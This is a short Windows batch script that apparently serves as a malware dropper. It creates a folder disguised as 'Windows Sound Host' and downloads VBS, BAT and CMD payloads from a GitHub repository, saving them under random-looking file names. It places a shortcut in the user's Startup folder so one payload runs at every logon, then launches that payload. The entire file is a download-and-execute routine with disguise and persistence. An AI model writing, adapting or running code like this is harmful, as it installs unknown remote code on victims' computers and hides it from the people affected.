@echo off 
cd \
cd %userprofile%\documents
if exist %userprofile%\documents\entr.bat(
    del  %userprofile%\documents\entr.bat
)
cd \ 
if not exist %userprofile%\documents\"Windows Sound Host" ( 
    mkdir "Windows Sound Host"
)
set path1= %userprofile%\documents\"Windows Sound Host"
cd %path1%



powershell Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/i.vbs' -Outfile ./15a65da65s1d8w86s51d8aw.vbs; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/snds.bat' -Outfile ./116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Autorun.cmd' -Outfile ./31513wd5w1d3a5wd185s3d51a.cmd

if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk ( 
    powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk');$s.TargetPath='%userprofile%\documents\Windows Sound Host\31513wd5w1d3a5wd185s3d51a.cmd';$s.Save()"
    
)
timeout 150
start 31513wd5w1d3a5wd185s3d51a.cmd



